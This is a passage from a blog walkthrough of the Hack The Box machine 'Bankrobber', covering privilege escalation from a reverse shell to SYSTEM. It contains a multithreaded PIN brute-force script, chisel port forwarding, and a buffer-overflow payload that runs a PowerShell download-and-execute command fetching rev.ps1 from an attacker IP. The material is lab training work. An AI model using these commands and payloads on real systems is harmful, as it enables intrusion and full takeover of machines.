</pre></table></code></div></div><p>Shortly, we get a reverse shell.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>$ rlwrap ncat -nlvp 4444

...

PS C:\xampp\htdocs\admin&gt; whoami
bankrobber\cortin
</pre></table></code></div></div><h2 id="privilege-escalation">Privilege Escalation</h2><p>Checking listening ports with <code class="language-plaintext highlighter-rouge">netstat</code>, we find a new port <code class="language-plaintext highlighter-rouge">910</code> which is not shown in our <code class="language-plaintext highlighter-rouge">nmap</code> scan.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre><td class="rouge-code"><pre>PS C:\xampp\htdocs\admin&gt; netstat -ano | findstr LISTEN
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       2512
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       756
  TCP    0.0.0.0:443            0.0.0.0:0              LISTENING       2512
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:910            0.0.0.0:0              LISTENING       1592
  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       2868
  TCP    0.0.0.0:49664          0.0.0.0:0              LISTENING       468
  TCP    0.0.0.0:49665          0.0.0.0:0              LISTENING       904
  TCP    0.0.0.0:49666          0.0.0.0:0              LISTENING       884
  TCP    0.0.0.0:49667          0.0.0.0:0              LISTENING       1456
  TCP    0.0.0.0:49668          0.0.0.0:0              LISTENING       596
  TCP    0.0.0.0:49669          0.0.0.0:0              LISTENING       604
  TCP    10.10.10.154:139       0.0.0.0:0              LISTENING       4
  TCP    [::]:80                [::]:0                 LISTENING       2512
  TCP    [::]:135               [::]:0                 LISTENING       756
  TCP    [::]:443               [::]:0                 LISTENING       2512
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:3306              [::]:0                 LISTENING       2868
  TCP    [::]:49664             [::]:0                 LISTENING       468
  TCP    [::]:49665             [::]:0                 LISTENING       904
  TCP    [::]:49666             [::]:0                 LISTENING       884
  TCP    [::]:49667             [::]:0                 LISTENING       1456
  TCP    [::]:49668             [::]:0                 LISTENING       596
  TCP    [::]:49669             [::]:0                 LISTENING       604
</pre></table></code></div></div><p>To play with the service, we will forward the port to us with <code class="language-plaintext highlighter-rouge">chisel</code>. First, we set up <code class="language-plaintext highlighter-rouge">chisel</code> server on our kali box.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>$ ./chisel server -p 8888 --reverse
</pre></table></code></div></div><p>Next, we send the Windows version of <code class="language-plaintext highlighter-rouge">chisel</code> to the target and forward the port to <code class="language-plaintext highlighter-rouge">9100</code> on our kali box.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>PS C:\xampp\htdocs\admin&gt; iwr http://10.10.14.7:8000/chisel.exe -outfile \windows\temp\chisel.exe

PS C:\xampp\htdocs\admin&gt; \windows\temp\chisel.exe client 10.10.14.7:8888 R:9100:127.0.0.1:910
</pre></table></code></div></div><p>Now that the port is forwarded, we can connect to it with <code class="language-plaintext highlighter-rouge">ncat</code> to see what it does. The program asks for a PIN code. Trying a random number, we get no luck.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>$ ncat -nv 127.0.0.1 9100                             
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Connected to 127.0.0.1:9100.
 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio &amp; Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] 1337
 [!] Access denied, disconnecting client....
</pre></table></code></div></div><p>Since the PIN code is a 4-digit number, we can easily brute force it. To do this, we write a python script that supports multi-threading and uses <code class="language-plaintext highlighter-rouge">pwntools</code> to handle data.</p><div class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
</pre><td class="rouge-code"><pre><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">from</span> <span class="nn">concurrent.futures</span> <span class="kn">import</span> <span class="n">ThreadPoolExecutor</span>

<span class="n">finished</span> <span class="o">=</span> <span class="bp">False</span>

<span class="k">def</span> <span class="nf">try_pin</span><span class="p">(</span><span class="n">pin</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">finished</span>
    <span class="k">if</span> <span class="ow">not</span> <span class="n">finished</span><span class="p">:</span>
        <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"127.0.0.1"</span><span class="p">,</span> <span class="mi">9100</span><span class="p">,</span> <span class="n">level</span><span class="o">=</span><span class="s">"error"</span><span class="p">)</span>
        <span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"[$] "</span><span class="p">)</span>
        <span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">pin</span><span class="p">)</span>
        <span class="n">response</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">()</span>
        <span class="n">r</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
        <span class="k">if</span> <span class="sa">b</span><span class="s">"denied"</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">response</span><span class="p">:</span>
            <span class="n">log</span><span class="p">.</span><span class="n">success</span><span class="p">(</span><span class="sa">f</span><span class="s">"Success: </span><span class="si">{</span><span class="n">pin</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
            <span class="n">finished</span> <span class="o">=</span> <span class="bp">True</span>

<span class="k">with</span> <span class="n">ThreadPoolExecutor</span><span class="p">(</span><span class="n">max_workers</span><span class="o">=</span><span class="mi">30</span><span class="p">)</span> <span class="k">as</span> <span class="n">executor</span><span class="p">:</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">9999</span><span class="p">):</span>
        <span class="n">pin</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">).</span><span class="n">zfill</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
        <span class="n">executor</span><span class="p">.</span><span class="n">submit</span><span class="p">(</span><span class="n">try_pin</span><span class="p">,</span> <span class="n">pin</span><span class="p">)</span>
</pre></table></code></div></div><p>After running the script, we get a valid PIN code.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>$ python3 brute.py
[+] Success: 0021
</pre></table></code></div></div><p>With the PIN code, we can let the program continue. It then asks for another input and execute some command.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
</pre><td class="rouge-code"><pre>$ ncat -nv 127.0.0.1 9100
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Connected to 127.0.0.1:9100.
 --------------------------------------------------------------
 Internet E-Coin Transfer System
 International Bank of Sun church
                                        v0.1 by Gio &amp; Cneeliz
 --------------------------------------------------------------
 Please enter your super secret 4 digit PIN code to login:
 [$] 0021
 [$] PIN is correct, access granted!
 --------------------------------------------------------------
 Please enter the amount of e-coins you would like to transfer:
 [$] 1
 [$] Transfering $1 using our e-coin transfer application. 
 [$] Executing e-coin transfer tool: C:\Users\admin\Documents\transfer.exe

 [$] Transaction in progress, you can safely disconnect...
</pre></table></code></div></div><p>We try to fuzz it with a bunch of <code class="language-plaintext highlighter-rouge">A</code>s, and we find that we have successfully overwritten the command executed.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>[$] Executing e-coin transfer tool: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
</pre></table></code></div></div><p>To find out the position of the command in our payload, we generate a pattern string with <code class="language-plaintext highlighter-rouge">msf-pattern_create</code>.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>$ msf-pattern_create -l 100
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
</pre></table></code></div></div><p>Using the pattern string instead of <code class="language-plaintext highlighter-rouge">A</code>s, we get the following results.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>[$] Executing e-coin transfer tool: 0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
</pre></table></code></div></div><p>Searching the above part in our pattern string, we find that it begins at the 32nd character.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>$ msf-pattern_offset -l 100 -q 0Ab1
[*] Exact match at offset 32
</pre></table></code></div></div><p>Knowing the offset, we are now able to craft a payload to precisely overwrite the command.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>$ python3 -c "print('A'*32 + 'powershell iex(new-object net.webclient).downloadstring(\'http://10.10.14.7:8000/rev.ps1\')')"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApowershell iex(new-object net.webclient).downloadstring('http://10.10.14.7:8000/rev.ps1')
</pre></table></code></div></div><p>We connect to the program again and paste our payload when asked for the input. It seems that the program is executing our command.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>[$] Executing e-coin transfer tool: powershell iex(new-object net.webclient).downloadstring('http://10.10.14.7:8000/rev.ps1')
</pre></table></code></div></div><p>Checking our <code class="language-plaintext highlighter-rouge">ncat</code> listener, we get a reverse shell with <code class="language-plaintext highlighter-rouge">system</code> privileges.</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>$ rlwrap ncat -nlvp 4444

...

PS C:\Windows\system32&gt; whoami
nt authority\system
</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/ctf-write-ups/'>CTF Write-ups</a>, <a href='/categories/hack-the-box/'>Hack The Box</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/oscp-prep/" class="post-tag no-text-decoration" >OSCP Prep</a> <a href="/tags/windows/" class="post-tag no-text-decoration" >Windows</a> <a href="/tags/xss/" class="post-tag no-text-decoration" >XSS</a> <a href="/tags/sql-injection/" class="post-tag no-text-decoration" >SQL Injection</a> <a href="/tags/ssrf/" class="post-tag no-text-decoration" >SSRF</a> <a href="/tags/pivoting/" class="post-tag no-text-decoration" >Pivoting</a> <a href="/tags/buffer-overflow/" class="post-tag no-text-decoration" >Buffer Overflow</a> <a href="/tags/python/" class="post-tag no-text-decoration" >Python</a> <a href="/tags/php/" class="post-tag no-text-decoration" >PHP</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=HTB - Bankrobber - QTranspose&url=https://qtranspose.xyz/posts/htb-bankrobber/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=HTB - Bankrobber - QTranspose&u=https://qtranspose.xyz/posts/htb-bankrobber/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=HTB - Bankrobber - QTranspose&url=https://qtranspose.xyz/posts/htb-bankrobber/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/htb-bankrobber/">HTB - Bankrobber</a><li><a href="/posts/htb-bounty/">HTB - Bounty</a><li><a href="/posts/htb-forest/">HTB - Forest</a><li><a href="/posts/htb-optimum/">HTB - Optimum</a><li><a href="/posts/htb-bastard/">HTB - Bastard</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/oscp-prep/">OSCP Prep</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/metasploit/">Metasploit</a> <a class="post-tag" href="/tags/powershell/">PowerShell</a> <a class="post-tag" href="/tags/burp-suite/">Burp Suite</a> <a class="post-tag" href="/tags/php/">PHP</a> <a class="post-tag" href="/tags/smb/">SMB</a> <a class="post-tag" href="/tags/active-directory/">Active Directory</a> <a class="post-tag" href="/tags/bash-scripting/">Bash Scripting</a> <a class="post-tag" href="/tags/bloodhound/">BloodHound</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/htb-bastard/"><div class="card-body"> <span class="timeago small" > Nov 28, 2020 <i class="unloaded">2020-11-28T00:00:00+11:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB - Bastard</h3><div class="text-muted small"><p> Bastard is a vulnerable virtual machine created by ch4p on HackTheBox. In this post, we document a complete walkthrough of pwning this machine. Enumeration Nmap Starting off with the nmap scan, ...</p></div></div></a></div><div class="card"> <a href="/posts/htb-devel/"><div class="card-body"> <span class="timeago small" > Nov 15, 2020 <i class="unloaded">2020-11-15T00:00:00+11:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB - Devel</h3><div class="text-muted small"><p> Devel is a vulnerable virtual machine created by ch4p on HackTheBox. In this post, we document a complete walkthrough of pwning this machine. Enumeration Nmap Starting off with the nmap scan, we...</p></div></div></a></div><div class="card"> <a href="/posts/htb-optimum/"><div class="card-body"> <span class="timeago small" > Nov 16, 2020 <i class="unloaded">2020-11-16T00:00:00+11:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>HTB - Optimum</h3><div class="text-muted small"><p> Optimum is a vulnerable virtual machine created by ch4p on HackTheBox. In this post, we document a complete walkthrough of pwning this machine. Enumeration Nmap Starting off with the nmap scan, ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/htb-forest/" class="btn btn-outline-primary" prompt="Older"><p>HTB - Forest</p></a> <a href="/posts/htb-time/" class="btn btn-outline-primary" prompt="Newer"><p>HTB - Time</p></a></div></div></div></div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script> <script type="text/javascript"> const imgs = document.querySelectorAll('.post-content img'); const observer = lozad(imgs); observer.observe(); </script><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"></div><div class="footer-right"><p class="mb-0"> © 2021 <a href="https://github.com/QTranspose">QTranspose</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">All rights reserved.</span></p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/tags/oscp-prep/">OSCP Prep</a> <a class="post-tag" href="/tags/windows/">Windows</a> <a class="post-tag" href="/tags/metasploit/">Metasploit</a> <a class="post-tag" href="/tags/powershell/">PowerShell</a> <a class="post-tag" href="/tags/burp-suite/">Burp Suite</a> <a class="post-tag" href="/tags/php/">PHP</a> <a class="post-tag" href="/tags/smb/">SMB</a> <a class="post-tag" href="/tags/active-directory/">Active Directory</a> <a class="post-tag" href="/tags/bash-scripting/">Bash Scripting</a> <a class="post-tag" href="/tags/bloodhound/">BloodHound</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://qtranspose.xyz{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
